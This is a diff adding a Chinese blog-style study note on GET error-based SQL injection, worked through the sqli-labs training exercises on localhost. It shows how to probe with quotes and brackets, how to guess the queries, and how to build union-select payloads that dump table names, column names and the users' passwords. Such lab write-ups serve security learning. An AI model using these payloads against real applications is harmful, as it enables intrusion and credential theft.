@@ -89,6 +89,103 @@
       </tags>
   </entry>
   <entry>
+    <title>GET基于报错的sql注入</title>
+    <url>/2020/10/06/GET%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p><img src="https://i.loli.net/2020/10/05/P5uQn2rkzWfaZ3q.jpg" alt="5f69af32b943b.jpg"></p>
+<a id="more"></a>
+
+<h3 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h3><p>数字型和字符型</p>
+<h3 id="GET基于报错的sql注入"><a href="#GET基于报错的sql注入" class="headerlink" title="GET基于报错的sql注入"></a>GET基于报错的sql注入</h3><p>通过再URL中修改对应的ID值，为正常数字，大数字，字符(单引号，双引号，括号),反斜杠\来探测URL中是否存在注入点</p>
+<p>这里我以sqli-labs中的题为例：</p>
+<h4 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h4><p>这里我再URL中输入<code>?id=1</code>来进行id传参，?不想我们以前写的<code>index.php?id=1</code>是因为如果不写前面的就表示默认页面或者index.php。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>
+
+<p>我们再输入<code>?id=1&#39;</code>返回sql错误</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>返回<code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code>，去掉最外面俩个单引号<code>&#39;1&#39;&#39; LIMIT 0,1&#39;</code>，</p>
+<p>我们猜测其真正的SQL语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select login_name,password from admin where id&#x3D;&#39;id&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<h4 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h4><p>我们输入<code>?id=1</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>
+
+<p>我们再输入<code>?id=1&#39;</code>返回sql错误</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>返回<code>&#39;&#39; LIMIT 0,1&#39;</code>,去掉单引号<code>&#39; LIMIT 0,1</code></p>
+<p>猜测SQL语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select login_name,password from admin where id&#x3D;id LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<h4 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h4><p>我们输入<code>?id=1</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>
+
+<p>我们再输入<code>?id=1&#39;</code>返回sql错误</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>返回<code>&#39;&#39;1&#39;&#39;) LIMIT 0,1&#39;</code>,去掉单引号<code>&#39;1&#39;&#39;) LIMIT 0,1</code></p>
+<p>猜测SQL语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select login_name,password from admin where id&#x3D;(&#39;id&#39;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>我们输入?id=1’) –+后发现可以绕过，证明我们猜测是正确的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>
+
+<h4 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h4><p>我们输入<code>?id=1</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>
+
+<p>我们再输入<code>?id=1&#39;</code>，<code>?id=1）</code>都没有错误，当我们输入?id=1”发现SQL错误</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>返回<code>&#39;&quot;1&quot;&quot;) LIMIT 0,1&#39;</code>，去掉单引号<code>&quot;1&quot;&quot;) LIMIT 0,1</code></p>
+<p>猜测SQL语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select login_name,password from admin where id&#x3D;(&quot;id&quot;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>我们输入?id=1”) –+后发现可以绕过，证明我们猜测是正确的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>
+
+<h3 id="GET基于报错的SQL注入利用"><a href="#GET基于报错的SQL注入利用" class="headerlink" title="GET基于报错的SQL注入利用"></a>GET基于报错的SQL注入利用</h3><h4 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h4><p>1.利用order by 判断字段数</p>
+<p>2.利用 union select 联合查询，获取表名。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() --+</span><br></pre></td></tr></table></figure>
+
+<p>3.利用union select 联合查询,获取字段名.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;users() --+</span><br></pre></td></tr></table></figure>
+
+<p>4.利用union select 联合查询，获取字段值。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39; union select 1,group_concat(username,0x3a,password),3 from users --+</span><br></pre></td></tr></table></figure>
+
+<h4 id="less1-1"><a href="#less1-1" class="headerlink" title="less1"></a>less1</h4><p><code>http://127.0.0.1/sqli/Less-1/?id=1&#39; order by 3 --+</code></p>
+<p><code>http://127.0.0.1/sqli/Less-1/?id=0&#39; union select 1,2,3 --+</code>这里发现2和3可以注入。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/sqli/Less-1/?id=0&#39; union select 1,user(),database() --+</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:root@localhost</span><br><span class="line">Your Password:security</span><br></pre></td></tr></table></figure>
+
+<p>换成<code>user()</code>和<code>database()</code>后发现登录用户是<code>root@localhost</code>，数据库是<code>security</code>。</p>
+<p><code>http://127.0.0.1/sqli/Less-1/?id=0&#39; union select 1,version(),database() --+</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:5.5.47 version 5.5.47</span><br><span class="line">Your Password:security</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到数据库版本是5.5.47，默认定义了information_schema数据库。</p>
+<p>获取表名：</p>
+<p><code>http://127.0.0.1/sqli/Less-1/?id=0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></p>
+<p><code>group_concat(table_name)</code>可以看到表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>获取字段名：</p>
+<p><code>http://127.0.0.1/sqli/Less-1/?id=0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:id,username,password</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>获取字段值：</p>
+<p><code>http://127.0.0.1/sqli/Less-1/?id=0&#39; union select 1,group_concat(username,0x3a,password),3 from users --+</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>web学习笔记</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>Sql</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Mysql注入有关知识</title>
     <url>/2020/10/04/Mysql%E6%B3%A8%E5%85%A5%E6%9C%89%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
     <content><![CDATA[<p><img src="https://i.loli.net/2020/10/03/aVpt3MfgbuD4GOT.jpg" alt="5f62d6baa37dd.jpg"></p>
